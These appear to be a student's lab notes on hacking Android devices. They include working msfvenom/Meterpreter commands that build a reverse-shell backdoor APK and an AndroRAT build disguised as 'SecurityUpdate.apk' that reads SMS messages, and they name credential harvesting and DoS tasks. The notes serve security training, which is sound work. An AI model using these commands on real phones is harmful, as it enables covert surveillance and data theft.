## Hack an Android Device by Creating Binary Payloads using Parrot Security
---
1. msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
2. cp /root/Desktop/Backdoor.apk /var/www/html/share/
3. msfconsole
4. use exploit/multi/handler
5. set payload android/meterpreter/reverse_tcp
6. set LHOST 10.10.1.13
7. exploit -j -z
8. install app on android 
9. sysinfo
10. ipconfig
11. pwd
12. cd /sdcard  `i.e /storage/emulated/0`
13. ps
**Lab Manual 4 - Page - 1843**

## Task 2: Harvest Users' Credentials using the Social-Engineer
---
**LAB Manual 4 - Page - 1856**
1. setoolkit


## Task 3: Launch a DoS Attack on a Target machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
---
**LAB Manual 4 - Page - 1866**


## Task 4: Exploit the Android Platform through ADB using PhoneSploit
---
**LAB Manual 4 - Page - 1874**

![[Pasted image 20241028015641.png]]
![[Pasted image 20241028015659.png]]
![[Pasted image 20241028015712.png]]


## Task 5: Hack an Android Device by Creating APK File using AndroRat
---
**LAB Manual 4 : Page .1888**
1. python3 androRAT.py --build -i 10.10.1.12 -p 4444 -o SecurityUpdate.apk
2. install this apk in android
3. python3 androRAT.py --shell -i 0.0.0.0 -p 4444
4. help
5. deviceInfo
6. getSMS inbox
7. getMACAddress
8. exit


# LAB 2 Secure Android Devices using Various Android Security Tools
---
## Task 1: Analyze a Malicious App using Online Android Analyzers
---
**LAB Manual 4 : Page .1898**


## Task 2: Secure Android Devices from Malicious Apps using Malwarebytes Security
---
**LAB Manual 4 : Page .1903**